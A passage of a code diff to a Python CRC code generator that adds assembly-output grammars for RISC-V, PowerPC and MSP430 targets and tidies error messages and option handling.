+				r"@add (@reg\[\w+\]), @imm\[(\d+)\]": "\taddi \\1, \\1, \\2",
+				r"@(add|sub|xor) (@regb?\[\w+\])": "\t\\1 \\2, \\2",
+				r"@and (@regb\[\w+\])": "\tandi \\1, \\1",
+				r"@orr (@regb\[\w+\])": "\tor \\1, \\1",
+				r"@sh([rl]) (@regb\[\w+\])": "\ts\\1li \\2, \\2",
+				r"@mvl": "@mov",
+				r"@mov (@regb?\[\d+\]), (@imm\[\d+\])": "\tli \\1, \\2",
+				r"@mvz (@regb?\[\d+\])": "\tmv \\1, zero",
+				r"@ldw (@reg\[\d+\]), (@reg\[\w+\])": "\tld \\1, (\\2)",
+				r"@stw (@reg\[\w+\]), (@reg\[\d+\])": "\tsd \\2, (\\1)",
+				r"@ldb (@regb\[\d+\]), (@reg\[\w+\])": "\tlbu \\1, (\\2)",
+				r"@stb (@reg\[\w+\]), (@regb\[\d+\])": "\tsb \\2, (\\1)",
+				r"@stb (@(?:in|tmp|out)\[\w+\]), (@regb\[\d+\])": "\tsb \\2, \\1",
+				r"@reg\[(\d+)\]" : lambda m, k: k.regw[int(m.group(1))],
+				r"@regb\[(\d+)\]": lambda m, k: k.regb[int(m.group(1))],
+				r"@function\[(\w+)\]": "\\1:",
+				r"@deflabel\[(\w+)\]": "@label[\\1]:",
+				r"@label\[(\w+)\]": ".L\\1",
+				r"@in\[(\d+)\]":  lambda m, k: f"{ofs if ( ofs := k. in_ofs + int(m.group(1)) ) != 0 else ''}(@reg[sp])",
+				r"@tmp\[(\d+)\]": lambda m, k: f"{ofs if ( ofs := k.tmp_ofs + int(m.group(1)) ) != 0 else ''}(@reg[sp])",
+				r"@out\[(\d+)\]": lambda m, k: f"{ofs if ( ofs := k.out_ofs + int(m.group(1)) ) != 0 else ''}(@reg[sp])",
+				r"@reg\[sp\]": "sp",
+				r"@imm\[(\d+)\]": "\\1",
+				r"@ldb": "\tlbu",
+				r"@jmp": "\tj",
+				r"@ret": "\tret",
+			},
+		},
+		"ppc64le-gas": {
+			"settings": {
+				"format"    : "RISC",
+				"byteorder" : "little",
+				"save_list" : None,
+				"reg_size"  : 64,
+				"max_ofs"   : (1 << 15) - 1,
+			},
+			# r0 is also volatile but apparantly is read as zero if it is used as a memory base address
+			"regw": ("r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11", "r12"),
+			"regb": ("r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10", "r11", "r12"),
+			"comment": '#',
+			"grammar": {
+				r"@jiz (@reg\[\d+\]), (@label\[\w+\])": ("\tcmpwi \\1, 0", "\tbeq \\2"),
+				r"@sub (@reg\[\w+\]), @imm\[(\d+)\]": "\taddi \\1, \\1, -\\2",
+				r"@add (@reg\[\w+\]), @imm\[(\d+)\]": "\taddi \\1, \\1, \\2",
+				r"@(add|xor) (@regb?\[\w+\])": "\t\\1 \\2, \\2",
+				r"@sub (@reg\[\w+\]), (@reg\[\d+\])": "\tsubf \\1, \\2, \\1",
+				r"@and (@regb\[\w+\])": "\tandi. \\1, \\1", # the dot is not a typo
+				r"@orr (@regb\[\w+\])": "\tor \\1, \\1",
+				r"@sh([rl]) (@regb\[\w+\])": "\ts\\1wi \\2, \\2",
+				r"@mvz (@regb?\[\d+\])": "\tli \\1, 0",
+				r"@mvl (@regb?\[\d+\]), @imm\[(\d+)\]": ppc64_mvl,
+
+				r"@ldw (@reg\[\d+\]), (@reg\[\w+\])": "\tld \\1, 0(\\2)",
+				r"@stw (@reg\[\w+\]), (@reg\[\d+\])": "\tstd \\2, 0(\\1)",
+				r"@ldb (@regb\[\d+\]), (@reg\[\w+\])": "\tlbz \\1, 0(\\2)",
+				r"@stb (@reg\[\w+\]), (@regb\[\d+\])": "\tstb \\2, 0(\\1)",
+				r"@stb (@(?:in|tmp|out)\[\w+\]), (@regb\[\d+\])": "\tstb \\2, \\1",
+
+				r"@reg\[(\d+)\]" : lambda m, k: k.regw[int(m.group(1))],
+				r"@regb\[(\d+)\]": lambda m, k: k.regb[int(m.group(1))],
+				r"@function\[(\w+)\]": "\\1:",
+				r"@deflabel\[(\w+)\]": "@label[\\1]:",
+				r"@label\[(\w+)\]": ".L\\1",
+				r"@in\[(\d+)\]":  lambda m, k: f"{k. in_ofs + int(m.group(1))}(@reg[sp])",
+				r"@tmp\[(\d+)\]": lambda m, k: f"{k.tmp_ofs + int(m.group(1))}(@reg[sp])",
+				r"@out\[(\d+)\]": lambda m, k: f"{k.out_ofs + int(m.group(1))}(@reg[sp])",
+				r"@reg\[sp\]": "r1",
+				r"@imm\[(\d+)\]": "\\1",
+
+				r"@ldb": "\tlbz",
+				r"@jmp": "\tb",
+				r"@ret": "\tblr",
+			}
+		},
+		"msp430-gas": {
+			"settings": {
+				"format"    : "CISC",
+				"byteorder" : "little",
+				"save_list" : None,
+				"reg_size"  : 16,
+				"max_ofs"   : (1 << 16) - 1,
+			},
+			"regw": ("r12", "r13", "r14", "r15", "r11"),
+			"regb": ("r12", "r13", "r14", "r15", "r11"),
+			"comment": ';',
+			"grammar": {
+				# idk why MSP430 is marketed as RISC. this is as CISC as it gets.
+				# you can litarally do `xor.b 32(r2), 16(r1)`. x86 can't even do that.
+				r"@jiz (@reg\[\d+\]), (@label\[\w+\])": ("\ttst \\1", "\tjz \\2"),
+				r"(@\w+\[.+?\]), (@\w+\[.+?\])": "\\2, \\1", # swap from 'dst, src' to 'src, dst'
+				r"@add @imm\[1\],": "\tinc",
+				r"@add @imm\[2\],": "\tincd",
+				r"@sub @imm\[1\],": "\tdec",
+				r"@sub @imm\[2\],": "\tdecd",
+				r"@(add|sub)": "\t\\1",
+				r"@orr": "\tbis.b",
+				r"@(and|xor)": "\t\\1.b",
+				r"@sh([lr]) @imm\[(\d+)\], (@regb\[\d+\])": lambda m, k: '\n'.join((f"\tr{m.group(1)}a.b {m.group(3)}",) * int(m.group(2))),
+				r"@mvz(?= @regb)": "\tclr.b",
+				r"@mvz": "\tclr",
+
+				r"@ldw (@reg\[\w+\])": "\tmov @\\1",
+				r"@stw (@reg\[\d+\]), (@reg\[\w+\])": "\tmov \\1, @\\2",
+				r"@ldb (@reg\[\w+\])": "\tmov.b @\\1",
+				r"@stb (@regb\[\d+\]), (@reg\[\w+\])": "\tmov.b \\1, @\\2",
+
+				r"@reg\[(\d+)\]" : lambda m, k: k.regw[int(m.group(1))],
+				r"@regb\[(\d+)\]": lambda m, k: k.regb[int(m.group(1))],
+				r"@function\[(\w+)\]": "\\1:",
+				r"@deflabel\[(\w+)\]": "@label[\\1]:",
+				r"@label\[(\w+)\]": ".L\\1",
+				r"@in\[(\d+)\]":  lambda m, k: f"{ofs}(@reg[sp])" if (ofs := k. in_ofs + int(m.group(1))) else "@@reg[sp]",
+				r"@tmp\[(\d+)\]": lambda m, k: f"{ofs}(@reg[sp])" if (ofs := k.tmp_ofs + int(m.group(1))) else "@@reg[sp]",
+				r"@out\[(\d+)\]": lambda m, k: f"{ofs}(@reg[sp])" if (ofs := k.out_ofs + int(m.group(1))) else "@@reg[sp]",
+				r"@reg\[sp\]": "r1",
+				r"@imm\[(\d+)\]": "#\\1",
+
+				r"@mov": "\tmov.b",
+				r"@jmp": "\tjmp",
+				r"@mvl": "\tmov",
+				r"@ret": "\tret",
 			},
 		},
 	}
@@ -1302,6 +1620,7 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 		r"@mov": "\tmovq",
 		r"@xor": "\txorb",
 		r"@jmp": "\tjmp",
+		r"@mvl": "\tmovq",
 		r"@ret": "\tret",
 	}
 
@@ -1340,6 +1659,7 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 		r"@add": "\taddl", r"@sub": "\tsubl",
 		r"@shl": "\tshll", r"@shr": "\tshrl",
 		r"@mov": "\tmovl",
+		r"@mvl": "\tmovl",
 	})
 
 	t["x64-apx-ms-nasm"] = t["x64-ms-nasm"].copy()
@@ -1395,11 +1715,13 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 	t["arm32-arm-gas"]["regw"]    = ("r0", "r1", "r2", "r3", "r12")
 	t["arm32-arm-gas"]["regb"]    = t["arm32-arm-gas"]["regw"]
 	t["arm32-arm-gas"]["grammar"] = t["arm32-arm-gas"]["grammar"].copy()
-	t["arm32-arm-gas"]["grammar"][r"@jiz (@reg\[\d+\]), (@label\[\w+\])"] = ("\ttst \\1, \\1", "\tbeq \\2")
-	t["arm32-arm-gas"]["grammar"][r"@mvz @regb?(\[\d+\])"]                = "\tmov @reg\\1, @imm[0]"
-	t["arm32-arm-gas"]["grammar"][r"@mvl (@regb?\[\d+\]), (@imm\[\d+\])"] = "\tldr \\1, =\\2"
-	t["arm32-arm-gas"]["grammar"][r"@imm\[(\d+)\]"]                       = "#\\1"
-	t["arm32-arm-gas"]["grammar"][r"@ret"]                                = "\tbx lr"
+	t["arm32-arm-gas"]["grammar"].update({
+		r"@jiz (@reg\[\d+\]), (@label\[\w+\])": ("\ttst \\1, \\1", "\tbeq \\2"),
+		r"@mvz @regb?(\[\d+\])":                "\tmov @reg\\1, @imm[0]",
+		r"@mvl (@regb?\[\d+\]), (@imm\[\d+\])": "\tldr \\1, =\\2",
+		r"@imm\[(\d+)\]":                       "#\\1",
+		r"@ret":                                "\tbx lr",
+	})
 
 	t["arm32-arm-armasm"] = t["arm32-arm-gas"].copy()
 	t["arm32-arm-armasm"]["grammar"] = t["arm32-arm-armasm"]["grammar"].copy()
@@ -1417,7 +1739,7 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 	t["arm32-thumb1-gas"]["settings"] = t["arm32-thumb1-gas"]["settings"].copy()
 	t["arm32-thumb1-gas"]["settings"]["max_ofs"] = (1 << 5) - 1
 	t["arm32-thumb1-gas"]["regw"] = ("r0", "r1", "r2", "r3")
-	t["arm32-thumb1-gas"]["regb"] = ("r0", "r1", "r2", "r3")
+	t["arm32-thumb1-gas"]["regb"] = t["arm32-thumb1-gas"]["regw"]
 	t["arm32-thumb1-gas"]["grammar"] = t["arm32-thumb1-gas"]["grammar"].copy()
 	t["arm32-thumb1-gas"]["grammar"][r"@jiz (@reg\[\d+\]), (@label\[\w+\])"] = ("\tcmp \\1, @imm[0]", "\tbeq \\2")
 
@@ -1425,9 +1747,36 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 	t["arm32-thumb1-armasm"]["grammar"] = t["arm32-thumb1-armasm"]["grammar"].copy()
 	t["arm32-thumb1-armasm"]["grammar"][r"@label\[(\w+)\]"] = lambda m, k: f"{k.function}_{m.group(1)}"
 
+	# RISC-V
+	t["rv32-gas"] = t["rv64-gas"].copy()
+	t["rv32-gas"]["settings"] = t["rv32-gas"]["settings"].copy()
+	t["rv32-gas"]["settings"]["reg_size"] = 32
+	t["rv32-gas"]["grammar"] = t["rv32-gas"]["grammar"].copy()
+	t["rv32-gas"]["grammar"].update({
+		r"@ldw (@reg\[\d+\]), (@reg\[\w+\])": "\tlw \\1, (\\2)",
+		r"@stw (@reg\[\w+\]), (@reg\[\d+\])": "\tsw \\2, (\\1)",
+	})
+
+	# PowerPC
+	t["ppc64be-gas"] = t["ppc64le-gas"].copy()
+	t["ppc64be-gas"]["settings"] = t["ppc64be-gas"]["settings"].copy()
+	t["ppc64be-gas"]["settings"]["byteorder"] = "big"
+
+	t["ppc-gas"] = t["ppc64be-gas"].copy()
+	t["ppc-gas"]["settings"] = t["ppc-gas"]["settings"].copy()
+	t["ppc-gas"]["settings"]["reg_size"] = 32
+	t["ppc-gas"]["regw"] = ("r3", "r4", "r5", "r6", "r7", "r8", "r9", "r10")
+	t["ppc-gas"]["regb"] = t["ppc-gas"]["regw"]
+	t["ppc-gas"]["grammar"] = t["ppc-gas"]["grammar"].copy()
+	t["ppc-gas"]["grammar"].update({
+		r"@mvl (@regb?\[\d+\]), @imm\[(\d+)\]": ppc_mvl,
+		r"@ldw (@reg\[\d+\]), (@reg\[\w+\])": "\tlwz \\1, 0(\\2)", # apparantly there is no `lw`
+		r"@stw (@reg\[\w+\]), (@reg\[\d+\])": "\tstw \\2, 0(\\1)",
+	})
 
 	asm_format_data = t.get(syntax[4:])
 	del t, x64_ms_apx_regw, x64_ms_apx_regb, x64_sysv_apx_regw, x64_sysv_apx_regb
+	del ppc_mvl, ppc64_mvl
 
 import re
 VHDL_IDENT    = re.compile(r"(?ai)^[a-z]\w*$")
@@ -1507,6 +1856,11 @@ VHDL_KEYWORDS = {
 def valid_varname(name: str) -> bool:
 	"returns whether or not a variable/signal name is valid in the current syntax"
 	import keyword # for python
+
+	if syntax.startswith("asm="):
+		# the variable names are only used in the comment for the C prototype, so it just has to be valid C.
+		# it doesn't really matter either way if it is valid since it is just a comment.
+		return bool(C_IDENT.fullmatch(name)) and name not in C_KEYWORDS
 
 	if not name and syntax in {"py", "pyt", "am", "nmg", "ch", "gv", "c", "c++", "v", "sv", "vhd"}:
 		return False
@@ -1595,22 +1949,22 @@ def run_job(
 	tmp_sgnl_base = args.tmp_name
 
 	if in_port == out_port:
-		raise ValueError(f"input port ('{in_port}') and output port ('{out_port}') can't be the same")
+		raise ValueError(f"input port ({in_port!r}) and output port ({out_port!r}) can't be the same")
 
 	if tmp_sgnl_base == in_port:
-		raise ValueError(f"tmp signal ('{tmp_sgnl_base}') and input port ('{in_port}') can't be the same")
+		raise ValueError(f"tmp signal ({tmp_sgnl_base!r}) and input port ({in_port!r}) can't be the same")
 
 	if tmp_sgnl_base == out_port:
-		raise ValueError(f"tmp signal ('{tmp_sgnl_base}') and output port ('{out_port}') can't be the same")
+		raise ValueError(f"tmp signal ({tmp_sgnl_base!r}) and output port ({out_port!r}) can't be the same")
 
 	if not valid_varname(in_port):
-		raise ValueError(f"input port ('{in_port}') is not a valid name in syntax '{syntax}'")
+		raise ValueError(f"input port ({in_port!r}) is not a valid name in syntax {syntax!r}")
 
 	if not valid_varname(out_port):
-		raise ValueError(f"output port ('{out_port}') is not a valid name in syntax '{syntax}'")
+		raise ValueError(f"output port ({out_port!r}) is not a valid name in syntax {syntax!r}")
 
 	if not valid_varname(tmp_sgnl_base):
-		raise ValueError(f"tmp name ('{tmp_sgnl_base}') is not a valid name in syntax '{syntax}'")
+		raise ValueError(f"tmp name ({tmp_sgnl_base!r}) is not a valid name in syntax {syntax!r}")
 
 	local_port = "local_" + out_port
 	max_io_pad = 1 + max(len(in_port), len(out_port))
@@ -1629,9 +1983,7 @@ def run_job(
 		if crc_name is not None:
 			raise Exception("`--algorithm` and `--polynomial` cannot both be provided.")
 
-		try:
-			import crcmod
-		except ImportError:
+		if not hasattr(crcmod, "__file__"):
 			raise Exception("custom CRCs require `crcmod-plus`.")
 
 		crc        = crcmod.mkCrcFun(poly, init, reflected, xor_out)
@@ -1647,9 +1999,7 @@ def run_job(
 
 		crc = zlib.crc32
 	else:
-		try:
-			import crcmod
-		except ImportError:
+		if not hasattr(crcmod, "__file__"):
 			raise Exception(f"CRCs other than crc32 require the `crcmod-plus` package. crc_name: {crc_name}")
 
 		if crc_name is None:
@@ -1658,7 +2008,7 @@ def run_job(
 		sum_len = sum_len_map.get(crcmod.predefined._simplify_name(crc_name), None)
 
 		if sum_len is None:
-			raise ValueError(f"crc name '{crc_name}' does not exist or is unknown")
+			raise ValueError(f"crc name {crc_name!r} does not exist or is unknown")
 
 		crc_name = crcmod.predefined._simplify_name(crc_name)
 		crc = crcmod.predefined.mkCrcFun(crc_name)
@@ -2238,8 +2588,6 @@ def run_job(
 		out_ofs = data_bits + len(tmp_defs)
 
 		if syntax == "asm=ir":
-			asm_ir_settings = asm_ir_settings.copy()
-
 			if verbose >= 1:
 				eprint(
 					f"# scheduling instructions\n"
@@ -2256,7 +2604,6 @@ def run_job(
 					f"| void crc{crc_name}_{data_len}(uint8_t {in_port}[{data_len}], uint{c_type_length(1 << sum_bits)}_t *{out_port});"
 				)
 
-
 			print( '\n'.join(asm_gen.gen_ir(
 				tmp_defs, outputs,
 				crc_name, data_len, sum_len,
@@ -2266,9 +2613,10 @@ def run_job(
 			return job_ret()
 
 		if asm_format_data is None:
-			raise Exception(f"mismatch between argparse syntax list and match/case syntax list. syntax: '{syntax}'")
+			raise Exception(f"mismatch between argparse syntax list and match/case syntax list. syntax: {syntax!r}")
 
 		asm_ir_settings = asm_format_data["settings"]
+		asm_ir_settings = asm_ir_settings.copy()
 
 		asm_ir_settings["reg_slots"] = len(asm_format_data["regw"])
 		asm_ir_settings["in_ofs"]    = in_ofs
@@ -2278,6 +2626,7 @@ def run_job(
 
 		grammar   = asm_format_data["grammar"]
 		byteorder = asm_ir_settings.pop("byteorder")
+		strict    = asm_ir_settings.pop("strict", True)
 
 		if verbose >= 1:
 			eprint(
@@ -2316,7 +2665,7 @@ def run_job(
 			program,
 			grammar,
 			pp_vars={"$byteorder": byteorder},
-			strict=False # TODO: probably remove this once it isn't needed for testing
+			strict=strict
 		)
 
 		print(f"{gd.comment} Generated with {prog}.py")
@@ -2415,10 +2764,10 @@ def run_job(
 			tmp_port_i = tmp_sgnl_base
 
 			if in_port in {"bit_", "byte_"}:
-				raise ValueError(f"`--in-port '{in_port}'` cannot be given with `--syntax '{syntax}'`")
+				raise ValueError(f"`--in-port {in_port!r}` cannot be given with `--syntax {syntax!r}`")
 
 			if out_port in {"bit_", "byte_"}:
-				raise ValueError(f"`--in-port '{out_port}'` cannot be given with `--syntax '{syntax}'`")
+				raise ValueError(f"`--in-port {out_port!r}` cannot be given with `--syntax {syntax!r}`")
 
 			if syntax in {"c", "c++"}:
 				print(
@@ -2701,7 +3050,7 @@ def run_job(
 				# just for the output
 				optimize_gates(rows)
 		case _:
-			raise Exception(f"mismatch between argparse syntax list and match/case syntax list. syntax: '{syntax}'")
+			raise Exception(f"mismatch between argparse syntax list and match/case syntax list. syntax: {syntax!r}")
 
 	return job_ret()
 
@@ -2718,7 +3067,7 @@ def parse_toml(source: str, files_seen: set) -> dict:
 			source = f.read()
 
 		if path in files_seen:
-			raise ValueError(f"duplicate TOML file path given: '{path}'")
+			raise ValueError(f"duplicate TOML file path given: {path!r}")
 
 		files_seen.add(path)
 	except FileNotFoundError, OSError:
@@ -2767,7 +3116,7 @@ def parse_input(args: object) -> list[dict[str, any]]:
 				"reflect":    args.reflect
 			}]
 		except ValueError:
-			raise ValueError(f"`--polynomial` given a non-integer value: '{args.polynomial}'")
+			raise ValueError(f"`--polynomial` given a non-integer value: {args.polynomial!r}")
 	elif not args.programs:
 		# neither positional nor polynomial is given
 		return [{
